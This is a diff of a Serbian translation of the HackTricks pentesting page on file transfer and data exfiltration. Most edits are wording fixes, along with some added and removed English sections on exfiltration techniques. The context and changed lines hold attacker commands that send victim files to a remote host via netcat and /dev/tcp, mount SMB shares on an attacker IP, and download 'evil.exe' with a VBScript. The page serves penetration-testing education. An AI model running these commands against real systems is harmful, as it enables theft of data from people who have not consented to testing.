@@ -6,7 +6,7 @@
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
@@ -16,15 +16,15 @@ Drugi načini podrške HackTricks-u:
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 ***
 
-## Često beleženi domeni za izfiltriranje informacija
+## Često beleženi domeni za izfiltraciju informacija
 
-Proverite [https://lots-project.com/](https://lots-project.com/) da biste pronašli često beležene domene koje mogu biti zloupotrebljene
+Proverite [https://lots-project.com/](https://lots-project.com/) da biste pronašli često beležene domene koji mogu biti zloupotrebljeni
 
 ## Kopiranje\&lepljenje Base64
 
@@ -65,7 +65,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Postavljanje fajlova
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer ispisuje GET i POST zahteve (uključujući i zaglavlja)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Python modul [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -133,8 +133,6 @@ sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
 ### FTP server (pure-ftp)
-
-### FTP server (čist-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -193,43 +191,34 @@ Windows
 
 ### Exfiltration
 
+#### Overview
+
+Exfiltration is the unauthorized transfer of data from a target system. This can be achieved through various methods, such as:
+
+- **Email**: Sending sensitive data as email attachments.
+- **FTP**: Uploading data to an FTP server.
+- **DNS**: Encoding data within DNS queries.
+- **HTTP/HTTPS**: Sending data over HTTP or HTTPS protocols.
+- **Cloud Storage**: Storing data in cloud storage services.
+
 #### Techniques
 
-1. **Exfiltration Over Command and Control Channel**: Utilize the existing command and control channel to exfiltrate data.
-
-2. **Exfiltration Over Alternative Protocol**: Use alternative protocols such as DNS, ICMP, or HTTP to exfiltrate data.
-
-3. **Exfiltration Over Unencrypted Protocols**: Leverage unencrypted protocols like FTP or Telnet to exfiltrate data.
-
-4. **Exfiltration Over Encrypted Protocols**: Utilize encrypted protocols like HTTPS or SSH to exfiltrate data.
+1. **Data Compression**: Compressing data before exfiltration to reduce size and avoid detection.
+2. **Data Encryption**: Encrypting data to prevent unauthorized access.
+3. **Steganography**: Hiding data within other files to avoid detection.
+4. **Data Fragmentation**: Splitting data into smaller fragments for exfiltration.
+5. **Traffic Obfuscation**: Masking exfiltration traffic to blend in with legitimate traffic.
 
 #### Tools
 
-- **Certutil**: Execute `certutil -encode` to encode data into base64 and `certutil -decode` to decode base64 data.
+- **Cobalt Strike**: A popular tool for post-exploitation activities, including exfiltration.
+- **PowerShell**: Built-in Windows tool used for various exfiltration techniques.
+- **Certutil**: Command-line utility for decoding/encoding data in Windows.
+- **Bitsadmin**: Command-line tool to create and monitor BITS jobs for data transfer.
 
-- **Bitsadmin**: Use `bitsadmin /transfer` to create BITS jobs for data transfer.
+#### Detection
 
-- **WMIC**: Execute `wmic process call create` to run commands on remote systems.
-
-- **PowerShell**: Utilize PowerShell commands like `Invoke-WebRequest` or `Invoke-RestMethod` for data exfiltration.
-
-- **FTP**: Use FTP clients like `ftp.exe` to transfer files to an FTP server.
-
-- **Netcat**: Utilize `nc.exe` to create reverse shells for exfiltration.
-
-- **PsExec**: Use `psexec.exe` to execute commands on remote systems.
-
-- **BITSAdmin**: Utilize `bitsadmin.exe` to create BITS jobs for data transfer.
-
-#### Countermeasures
-
-- **Network Segmentation**: Implement network segmentation to restrict lateral movement and data exfiltration.
-
-- **Monitoring**: Monitor network traffic for any suspicious activities or data leaving the network.
-
-- **Encryption**: Encrypt sensitive data to prevent unauthorized access during exfiltration.
-
-- **Access Control**: Implement strict access controls to limit the transfer of data to authorized personnel only.
+Detection of exfiltration activities can be challenging due to the use of legitimate protocols and encryption. Monitoring network traffic, analyzing data transfers, and implementing data loss prevention (DLP) solutions can help in detecting and preventing data exfiltration.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -253,26 +242,16 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-Netcat (NC) je moćan alat za mrežno testiranje i komunikaciju. Može se koristiti za prenos podataka preko mreže koristeći TCP ili UDP protokole. NC može biti koristan alat za izvlačenje podataka tokom testiranja penetracije. 
+### Netcat
 
-### Korišćenje NC za eksfiltraciju podataka
-
-Kada ste uspeli da dobijete pristup ciljanom sistemu, možete koristiti NC za eksfiltraciju osetljivih podataka. Na primer, možete koristiti sledeću komandu da biste poslali fajl sa ciljnog sistema na vaš kontrolni server:
-
-```bash
-nc -w 3 <IP_adresa_kontrolnog_servera> <port> < fajl_za_slanje
-```
-
-Ova komanda koristi NC da uspostavi TCP konekciju sa kontrolnim serverom na određenoj IP adresi i portu, a zatim šalje sadržaj fajla `<fajl_za_slanje>` preko te konekcije. 
-
-Budite oprezni prilikom korišćenja NC za eksfiltraciju podataka, jer nešifrovani prenos podataka preko mreže može biti otkriven i praćen.
+Netcat is a versatile networking utility that can be used for reading from and writing to network connections using TCP or UDP. It can also be used to set up a simple file server or transfer files between systems. Netcat can be a powerful tool for exfiltrating data during a penetration test.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Preuzimanje fajla sa žrtve
+### Preuzimanje fajla sa žrtvine mašine
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
@@ -314,7 +293,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 
 Podrazumevano u XP i 2003 (u drugima mora biti eksplicitno dodato tokom instalacije)
 
-Na Kali, **pokreni TFTP server**:
+Na Kali, **pokrenite TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -338,7 +317,9 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-## VBScript
+### VBScript Exfiltration
+
+VBScript can be used to exfiltrate data by sending it over HTTP or HTTPS to an attacker-controlled server. This can be achieved by creating an HTTP request object, setting the request headers and body with the data to exfiltrate, and sending the request to the attacker's server. This technique can be used to exfiltrate sensitive information such as passwords, documents, or system information.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -376,7 +357,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Program `debug.exe` ne samo što omogućava inspekciju binarnih fajlova već takođe ima **mogućnost da ih rekonstruiše iz heksadecimalnog formata**. To znači da, pružajući heksadecimalni zapis binarnog fajla, `debug.exe` može generisati binarni fajl. Međutim, važno je napomenuti da debug.exe ima **ograničenje u sastavljanju fajlova do veličine od 64 kb**.
+Program `debug.exe` ne samo što omogućava inspekciju binarnih fajlova već takođe ima **mogućnost da ih rekonstruiše iz heksadecimalnog koda**. To znači da, pružajući heksadecimalni kod binarnog fajla, `debug.exe` može generisati binarni fajl. Međutim, važno je napomenuti da debug.exe ima **ograničenje u sastavljanju fajlova do veličine od 64 kb**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -388,7 +369,7 @@ wine exe2bat.exe nc.exe nc.txt
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -398,7 +379,7 @@ wine exe2bat.exe nc.exe nc.txt
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
